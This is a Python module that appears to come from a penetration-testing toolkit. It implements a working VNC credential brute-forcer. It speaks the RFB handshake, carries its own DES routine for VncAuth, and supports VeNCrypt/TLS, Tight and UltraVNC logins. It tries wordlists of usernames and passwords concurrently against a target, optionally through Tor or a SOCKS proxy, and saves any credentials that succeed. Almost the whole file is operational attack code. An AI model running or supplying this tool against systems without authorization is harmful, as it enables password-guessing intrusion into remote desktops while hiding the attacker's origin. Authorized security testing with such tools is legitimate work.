import socket
import ssl
import struct
import time
from abc import ABC, abstractmethod
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import Optional, Dict, Any, List, Tuple
from tqdm import tqdm
from Dependencies.displays import M, W, R, Y, G, C
from Dependencies.save_output import add_result


# Utility
def log(msg):
    tqdm.write(msg)


def parse_value(value):
    if not value.startswith("@"):
        return [value]

    path = value[1:]
    encodings = ("utf-8-sig", "cp1252", "iso-8859-1")

    for encoding in encodings:
        try:
            with open(path, "r", encoding=encoding) as f:
                return [line.strip() for line in f if line.strip()]
        except UnicodeDecodeError:
            continue
        except FileNotFoundError:
            raise SystemExit(f"[!] File not found: {path}")

    raise SystemExit(f"[!] Unable to decode file: {path}. Supported encodings: {', '.join(encodings)}")


# Proxy support
try:
    import socks
    HAS_PYSOCKS = True
except ImportError:
    HAS_PYSOCKS = False


def setup_proxy(args):
    if args.tor:
        proxy_host, proxy_port = "127.0.0.1", 9050
    elif args.proxy:
        proxy_host, proxy_port = args.proxy.rsplit(":", 1)
        proxy_port = int(proxy_port)
    else:
        return

    if not HAS_PYSOCKS:
        raise SystemExit(f"{R}[!] PySocks is required for --tor / --proxy. Install: pip install PySocks")

    socks.set_default_proxy(socks.SOCKS5, proxy_host, proxy_port, rdns=True)
    socket.socket = socks.socksocket

    def _proxied_create_connection(address, timeout=socket._GLOBAL_DEFAULT_TIMEOUT, **kwargs):
        host, port = address
        s = socks.socksocket()
        if timeout is not socket._GLOBAL_DEFAULT_TIMEOUT:
            s.settimeout(timeout)
        s.connect((host, port))
        return s

    socket.create_connection = _proxied_create_connection
    log(f"{C}[*] SOCKS5 proxy:{W} {proxy_host}:{proxy_port}")


# Errors
class VNCError(Exception): pass
class ProtocolError(VNCError): pass
class UnsupportedSecurity(VNCError): pass
class AuthenticationFailed(VNCError): pass
class CredentialsMissing(VNCError): pass


# Credentials
@dataclass
class Credentials:
    username: Optional[str] = None
    password: Optional[str] = None
    extras: Dict[str, Any] = field(default_factory=dict)
    def __repr__(self):
        u = self.username or "-"
        p = "***" if self.password else "-"
        return f"Credentials(user={u}, pass={p})"


# Connection wrapper
def _recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            raise ConnectionError("Connection closed")
        data += chunk
    return data


class VNCConnection:
    def __init__(self, sock, host, port, version):
        self.sock = sock
        self.host = host
        self.port = port
        self.version = version
        self._major, self._minor = self._parse_version(version)

    @staticmethod
    def _parse_version(version):
        try:
            _, num = version.split(" ")
            major, minor = num.split(".")
            return int(major), int(minor)
        except Exception:
            return 3, 8

    @property
    def rfb_ge_37(self):
        return (self._major, self._minor) >= (3, 7)

    def recv_exact(self, n):
        return _recv_exact(self.sock, n)

    def recv_u8(self):
        return self.recv_exact(1)[0]

    def recv_u32(self):
        return struct.unpack(">I", self.recv_exact(4))[0]

    def send(self, data):
        self.sock.sendall(data)

    def close(self):
        try:
            self.sock.close()
        except Exception:
            pass


# Crypto (DES) - VNC variant
def _vnc_des_key(password: str) -> bytes:
    """VNC uses a DES key derived from the password with bit-reversed bytes."""
    pw = (password + "\x00" * 8)[:8]
    key = bytearray(8)
    for i in range(8):
        c = ord(pw[i])
        r = 0
        for b in range(8):
            r |= ((c >> b) & 1) << (7 - b)
        key[i] = r
    return bytes(key)


_DES_PC1 = [
    57, 49, 41, 33, 25, 17, 9, 1, 58, 50, 42, 34, 26, 18,
    10, 2, 59, 51, 43, 35, 27, 19, 11, 3, 60, 52, 44, 36,
    63, 55, 47, 39, 31, 23, 15, 7, 62, 54, 46, 38, 30, 22,
    14, 6, 61, 53, 45, 37, 29, 21, 13, 5, 28, 20, 12, 4,
]
_DES_PC2 = [
    14, 17, 11, 24, 1, 5, 3, 28, 15, 6, 21, 10,
    23, 19, 12, 4, 26, 8, 16, 7, 27, 20, 13, 2,
    41, 52, 31, 37, 47, 55, 30, 40, 51, 45, 33, 48,
    44, 49, 39, 56, 34, 53, 46, 42, 50, 36, 29, 32,
]
_DES_IP = [
    58, 50, 42, 34, 26, 18, 10, 2, 60, 52, 44, 36, 28, 20, 12, 4,
    62, 54, 46, 38, 30, 22, 14, 6, 64, 56, 48, 40, 32, 24, 16, 8,
    57, 49, 41, 33, 25, 17, 9, 1, 59, 51, 43, 35, 27, 19, 11, 3,
    61, 53, 45, 37, 29, 21, 13, 5, 63, 55, 47, 39, 31, 23, 15, 7,
]
_DES_FP = [
    40, 8, 48, 16, 56, 24, 64, 32, 39, 7, 47, 15, 55, 23, 63, 31,
    38, 6, 46, 14, 54, 22, 62, 30, 37, 5, 45, 13, 53, 21, 61, 29,
    36, 4, 44, 12, 52, 20, 60, 28, 35, 3, 43, 11, 51, 19, 59, 27,
    34, 2, 42, 10, 50, 18, 58, 26, 33, 1, 41, 9, 49, 17, 57, 25,
]
_DES_E = [
    32, 1, 2, 3, 4, 5, 4, 5, 6, 7, 8, 9,
    8, 9, 10, 11, 12, 13, 12, 13, 14, 15, 16, 17,
    16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,
    24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1,
]
_DES_P = [
    16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10,
    2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25,
]
_DES_SBOX = [
    [14,4,13,1,2,15,11,8,3,10,6,12,5,9,0,7,
     0,15,7,4,14,2,13,1,10,6,12,11,9,5,3,8,
     4,1,14,8,13,6,2,11,15,12,9,7,3,10,5,0,
     15,12,8,2,4,9,1,7,5,11,3,14,10,0,6,13],
    [15,1,8,14,6,11,3,4,9,7,2,13,12,0,5,10,
     3,13,4,7,15,2,8,14,12,0,1,10,6,9,11,5,
     0,14,7,11,10,4,13,1,5,8,12,6,9,3,2,15,
     13,8,10,1,3,15,4,2,11,6,7,12,0,5,14,9],
    [10,0,9,14,6,3,15,5,1,13,12,7,11,4,2,8,
     13,7,0,9,3,4,6,10,2,8,5,14,12,11,15,1,
     13,6,4,9,8,15,3,0,11,1,2,12,5,10,14,7,
     1,10,13,0,6,9,8,7,4,15,14,3,11,5,2,12],
    [7,13,14,3,0,6,9,10,1,2,8,5,11,12,4,15,
     13,8,11,5,6,15,0,3,4,7,2,12,1,10,14,9,
     10,6,9,0,12,11,7,13,15,1,3,14,5,2,8,4,
     3,15,0,6,10,1,13,8,9,4,5,11,12,7,2,14],
    [2,12,4,1,7,10,11,6,8,5,3,15,13,0,14,9,
     14,11,2,12,4,7,13,1,5,0,15,10,3,9,8,6,
     4,2,1,11,10,13,7,8,15,9,12,5,6,3,0,14,
     11,8,12,7,1,14,2,13,6,15,0,9,10,4,5,3],
    [12,1,10,15,9,2,6,8,0,13,3,4,14,7,5,11,
     10,15,4,2,7,12,9,5,6,1,13,14,0,11,3,8,
     9,14,15,5,2,8,12,3,7,0,4,10,1,13,11,6,
     4,3,2,12,9,5,15,10,11,14,1,7,6,0,8,13],
    [4,11,2,14,15,0,8,13,3,12,9,7,5,10,6,1,
     13,0,11,7,4,9,1,10,14,3,5,12,2,15,8,6,
     1,4,11,13,12,3,7,14,10,15,6,8,0,5,9,2,
     6,11,13,8,1,4,10,7,9,5,0,15,14,2,3,12],
    [13,2,8,4,6,15,11,1,10,9,3,14,5,0,12,7,
     1,15,13,8,10,3,7,4,12,5,6,11,0,14,9,2,
     7,11,4,1,9,12,14,2,0,6,10,13,15,3,5,8,
     2,1,14,7,4,10,8,13,15,12,9,0,3,5,6,11],
]
_DES_SHIFTS = [1, 1, 2, 2, 2, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]


def _permute(bits, table, in_len):
    out = 0
    for pos in table:
        out = (out << 1) | ((bits >> (in_len - pos)) & 1)
    return out


def _des_subkeys(key: bytes):
    k = int.from_bytes(key, "big")
    k = _permute(k, _DES_PC1, 64)
    c = (k >> 28) & 0xFFFFFFF
    d = k & 0xFFFFFFF
    keys = []
    for shift in _DES_SHIFTS:
        c = ((c << shift) | (c >> (28 - shift))) & 0xFFFFFFF
        d = ((d << shift) | (d >> (28 - shift))) & 0xFFFFFFF
        cd = (c << 28) | d
        keys.append(_permute(cd, _DES_PC2, 56))
    return keys


def _feistel(r, subkey):
    x = _permute(r, _DES_E, 32) ^ subkey
    out = 0
    for i in range(8):
        chunk = (x >> (42 - i * 6)) & 0x3F
        row = ((chunk >> 4) & 0x2) | (chunk & 0x1)
        col = (chunk >> 1) & 0xF
        out = (out << 4) | _DES_SBOX[i][row * 16 + col]
    return _permute(out, _DES_P, 32)


def _des_encrypt(block: bytes, key: bytes) -> bytes:
    subkeys = _des_subkeys(key)
    m = int.from_bytes(block, "big")
    m = _permute(m, _DES_IP, 64)
    l = (m >> 32) & 0xFFFFFFFF
    r = m & 0xFFFFFFFF
    for k in subkeys:
        l, r = r, l ^ _feistel(r, k)
    pre = (r << 32) | l
    out = _permute(pre, _DES_FP, 64)
    return out.to_bytes(8, "big")


# Security handlers
class SecurityHandler(ABC):
    security_type = None
    name = "unknown"

    @abstractmethod
    def authenticate(self, conn: VNCConnection, credentials: Credentials):
        raise NotImplementedError


# --- None ---------------------------------------------------------------
class NoneAuth(SecurityHandler):
    security_type = 1
    name = "None"
    def authenticate(self, conn, credentials):
        return


# --- VncAuth ------------------------------------------------------------
class VncAuth(SecurityHandler):
    security_type = 2
    name = "VncAuth"

    def authenticate(self, conn, credentials):
        if not credentials.password:
            raise CredentialsMissing("VncAuth requires a password")

        challenge = conn.recv_exact(16)
        key = _vnc_des_key(credentials.password)
        response = (_des_encrypt(challenge[:8], key) + _des_encrypt(challenge[8:], key))
        conn.send(response)


# --- VeNCrypt -----------------------------------------------------------
VENCRYPT_PLAIN      = 256
VENCRYPT_TLSNONE    = 257
VENCRYPT_TLSVNC     = 258
VENCRYPT_TLSPLAIN   = 259
VENCRYPT_X509NONE   = 260
VENCRYPT_X509VNC    = 261
VENCRYPT_X509PLAIN  = 262
VENCRYPT_RA2        = 263
VENCRYPT_RA2NE      = 264
VENCRYPT_RA256      = 265
VENCRYPT_RA2_256    = 266
VENCRYPT_SUBTYPE_NAMES = {
    256: "Plain", 257: "TLSNone", 258: "TLSVnc", 259: "TLSPlain",
    260: "X509None", 261: "X509Vnc", 262: "X509Plain",
    263: "RA2", 264: "RA2ne", 265: "RA256", 266: "RA2_256",
}


class VeNCryptSubHandler(SecurityHandler):
    subtype = None


class VeNCrypt(SecurityHandler):
    security_type = 19
    name = "VeNCrypt"
    SUBHANDLERS: Dict[int, VeNCryptSubHandler] = {}
    def authenticate(self, conn, credentials):
        conn.send(b"\x00\x02")
        major, minor = conn.recv_exact(2)
        if major != 0:
            raise UnsupportedSecurity(f"VeNCrypt version {major}.{minor} unsupported")

        n = conn.recv_u8()
        subtypes = list(conn.recv_exact(n))
        conn.send(bytes([0]))  # ack

        handler = None
        for st in subtypes:
            if st in self.SUBHANDLERS:
                handler = self.SUBHANDLERS[st]
                break

        if handler is None:
            raise UnsupportedSecurity(f"No supported VeNCrypt subtype in {subtypes}")

        conn.send(bytes([handler.subtype]))
        handler.authenticate(conn, credentials)


# --- TLS (VeNCrypt) ------------------------------------------------
class _TLSBase(VeNCryptSubHandler):
    def _wrap_tls(self, conn, credentials):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        if credentials.extras.get("verify", False):
            ctx.verify_mode = ssl.CERT_REQUIRED
            if ca := credentials.extras.get("cafile"):
                ctx.load_verify_locations(ca)
        else:
            ctx.verify_mode = ssl.CERT_NONE

        if cert := credentials.extras.get("certfile"):
            ctx.load_cert_chain(cert, credentials.extras.get("keyfile"))

        tls_sock = ctx.wrap_socket(conn.sock, server_hostname=conn.host)
        conn.sock = tls_sock


def _plain_exchange(conn, credentials):
    if not credentials.username or not credentials.password:
        raise CredentialsMissing("Plain requires username + password")
    u = credentials.username.encode("utf-8")
    p = credentials.password.encode("utf-8")
    conn.send(struct.pack(">II", len(u), len(p)) + u + p)


class TLSNoneAuth(_TLSBase):
    subtype = VENCRYPT_TLSNONE
    name = "TLSNone"

    def authenticate(self, conn, credentials):
        self._wrap_tls(conn, credentials)


class TLSVncAuth(_TLSBase):
    subtype = VENCRYPT_TLSVNC
    name = "TLSVnc"

    def authenticate(self, conn, credentials):
        self._wrap_tls(conn, credentials)
        VncAuth().authenticate(conn, credentials)


class TLSPlainAuth(_TLSBase):
    subtype = VENCRYPT_TLSPLAIN
    name = "TLSPlain"

    def authenticate(self, conn, credentials):
        self._wrap_tls(conn, credentials)
        _plain_exchange(conn, credentials)


class X509NoneAuth(_TLSBase):
    subtype = VENCRYPT_X509NONE
    name = "X509None"

    def authenticate(self, conn, credentials):
        credentials.extras.setdefault("verify", True)
        self._wrap_tls(conn, credentials)


class X509VncAuth(_TLSBase):
    subtype = VENCRYPT_X509VNC
    name = "X509Vnc"

    def authenticate(self, conn, credentials):
        credentials.extras.setdefault("verify", True)
        self._wrap_tls(conn, credentials)
        VncAuth().authenticate(conn, credentials)


class X509PlainAuth(_TLSBase):
    subtype = VENCRYPT_X509PLAIN
    name = "X509Plain"

    def authenticate(self, conn, credentials):
        credentials.extras.setdefault("verify", True)
        self._wrap_tls(conn, credentials)
        _plain_exchange(conn, credentials)


VeNCrypt.SUBHANDLERS.update({
    VENCRYPT_TLSNONE:   TLSNoneAuth(),
    VENCRYPT_TLSVNC:    TLSVncAuth(),
    VENCRYPT_TLSPLAIN:  TLSPlainAuth(),
    VENCRYPT_X509NONE:  X509NoneAuth(),
    VENCRYPT_X509VNC:   X509VncAuth(),
    VENCRYPT_X509PLAIN: X509PlainAuth()
})


# --- Tight --------------------------------------------------------------
TIGHT_NOAUTH   = 1
TIGHT_VNCAUTH  = 2

class TightSecurity(SecurityHandler):
    security_type = 16
    name = "Tight"

    def authenticate(self, conn, credentials):
        # RFB 3.8 : u32 count then count * u32 subtypes
        n = conn.recv_u32()
        subtypes = [conn.recv_u32() for _ in range(n)]

        if TIGHT_NOAUTH in subtypes:
            conn.send(bytes([TIGHT_NOAUTH]))
            return
        if TIGHT_VNCAUTH in subtypes:
            conn.send(bytes([TIGHT_VNCAUTH]))
            VncAuth().authenticate(conn, credentials)
            return

        raise UnsupportedSecurity(f"Tight subtypes unsupported: {subtypes}")


# --- UltraVNC -----------------------------------------------------------
class UltraVNCSecurity(SecurityHandler):
    security_type = 17
    name = "UltraVNC"
    def authenticate(self, conn, credentials):
        if not credentials.username or not credentials.password:
            raise CredentialsMissing("UltraVNC requires username + password")

        u = credentials.username.encode("latin-1")[:255]
        p = credentials.password.encode("latin-1")[:255]
        conn.send(bytes([len(u), len(p)]) + u + p)
        status = conn.recv_u32()
        if status != 0:
            raise AuthenticationFailed(f"UltraVNC auth failed (status={status})")


# --- RealVNC SystemAuth -------------------------------------------------
class SystemAuth(SecurityHandler):
    security_type = 0x10
    name = "SystemAuth"
    def authenticate(self, conn, credentials):
        if not credentials.username or not credentials.password:
            raise CredentialsMissing("SystemAuth requires username + password")
        raise UnsupportedSecurity(
            "SystemAuth handshake not implemented yet — extend here"
        )


# global reg
SECURITY_HANDLERS: Dict[int, SecurityHandler] = {
    1:    NoneAuth(),
    2:    VncAuth(),
    16:   TightSecurity(),
    17:   UltraVNCSecurity(),
    19:   VeNCrypt(),
    0x10: SystemAuth()
}

SECURITY_TYPE_NAMES = {
    0: "Invalid", 1: "None", 2: "VncAuth",
    16: "Tight", 17: "UltraVNC", 18: "TLS", 19: "VeNCrypt",
    20: "SASL", 21: "MD5", 22: "XVP", 30: "Apple ARD",
}


def choose_handler(server_types, preferred=None):
    order = preferred or server_types
    for t in order:
        if t in SECURITY_HANDLERS:
            return t, SECURITY_HANDLERS[t]
    return None, None


# RFB protocol negotiation
def negotiate_rfb(sock, host, port):
    banner = b""
    while len(banner) < 12:
        chunk = sock.recv(12 - len(banner))
        if not chunk:
            raise ProtocolError("Server closed during banner")
        banner += chunk

    if not banner.startswith(b"RFB "):
        raise ProtocolError(f"Not a VNC server (banner={banner!r})")

    version = banner.decode("ascii", errors="replace").strip()
    conn = VNCConnection(sock, host, port, version)
    if conn.rfb_ge_37:
        conn.send(b"RFB 003.008\n")
    else:
        conn.send(b"RFB 003.003\n")
    return conn


def read_security_types(conn):
    if conn.rfb_ge_37:
        n = conn.recv_u8()
        if n == 0:
            reason_len = conn.recv_u32()
            reason = conn.recv_exact(reason_len).decode("ascii", errors="replace")
            raise ProtocolError(f"Server refused: {reason}")
        return list(conn.recv_exact(n))
    else:
        t = conn.recv_u32()
        return [t]


def select_and_announce(conn, server_types, preferred=None):
    stype, handler = choose_handler(server_types, preferred)
    if handler is None:
        names = [SECURITY_TYPE_NAMES.get(t, str(t)) for t in server_types]
        raise UnsupportedSecurity(f"No supported security type in {names}")

    if conn.rfb_ge_37:
        conn.send(bytes([stype]))
    return handler


def read_security_result(conn):
    if conn.rfb_ge_37:
        return conn.recv_u32()
    return 0


# Client : vnc_test
def vnc_test(args, host, password, username=None):
    start = time.perf_counter()
    creds = Credentials(username=username, password=password)

    try:
        if args.verbose:
            label = f"{username}:{password}" if username else (password or "no-auth")
            log(f"{W}[*] Trying: {label}{W}")

        sock = socket.create_connection((host, args.port), timeout=args.timeout)
        sock.settimeout(args.timeout)
        conn = negotiate_rfb(sock, host, args.port)

        if args.verbose:
            log(f"{C}[*] Server version: {W}{conn.version}")

        server_types = read_security_types(conn)
        if args.verbose:
            names = [SECURITY_TYPE_NAMES.get(t, f"Unknown({t})") for t in server_types]
            log(f"{C}[*] Security types: {W}{', '.join(names)}")

        handler = select_and_announce(conn, server_types)
        if args.verbose:
            log(f"{C}[*] Using handler: {W}{handler.name}")

        handler.authenticate(conn, creds)
        status = read_security_result(conn)
        latency = time.perf_counter() - start
        if status != 0:
            raise AuthenticationFailed("Authentication failed")

        cred_label = f"{username}:{password}" if username else (password or "no-auth")
        log(f"{G}[+] VNC success: {C}{cred_label}{W}")
        log(f"{G}[+] Server:{W} {host}:{args.port}")
        log(f"{G}[+] Version:{W} {conn.version}")
        log(f"{G}[+] Handler:{W} {handler.name}")
        log(f"{G}[+] Latency:{W} {latency:.3f}s")

        if args.save:
            add_result(
                "VNC",
                {
                    "type": "credentials",
                    "data": {
                        "source": "vnc",
                        "host": host,
                        "port": args.port,
                        "username": username,
                        "password": password,
                        "security": handler.name,
                    },
                },
            )

        conn.close()
        return True

    except AuthenticationFailed:
        if args.verbose:
            log(f"{M}[-] Auth failed: {password} ({time.perf_counter()-start:.3f}s){W}")
        return False
    except VNCError as e:
        if args.verbose:
            log(f"{M}[-] VNC error: {e}{W}")
        return False
    except socket.timeout:
        if args.verbose:
            log(f"{M}[-] VNC timeout{W}")
        return False
    except Exception as e:
        if args.verbose:
            log(f"{M}[-] Unexpected: {e}{W}")
        return False


# Driver : dovnc
def dovnc(args, host):
    passwords = parse_value(args.password) if args.password else [""]
    usernames = parse_value(args.user) if getattr(args, "user", None) else [None]
    total_jobs = len(passwords) * len(usernames)

    if args.tor and args.proxy:
        raise SystemExit(f"{R}[!] Cannot use both --tor and --proxy")
    if total_jobs == 0:
        raise SystemExit(f"{R}[!] Empty password list")

    setup_proxy(args)
    print(f"{C}[*] VNC target:{W} {host}:{args.port}")
    print(f"{C}[*] Users:{W} {len(usernames)} | {C}Passwords:{W} {len(passwords)} | {C}Tests:{W} {total_jobs}")
    jobs = []
    progress = tqdm(total=total_jobs, desc="VNC", unit="test", dynamic_ncols=True)
    
    try:
        with ThreadPoolExecutor(max_workers=args.concurrency) as executor:
            for user in usernames:
                for password in passwords:
                    jobs.append(executor.submit(vnc_test, args, host, password, user))

            for job in as_completed(jobs):
                try:
                    if job.result():
                        for pending in jobs:
                            pending.cancel()
                        break
                finally:
                    progress.update(1)
    finally:
        progress.close()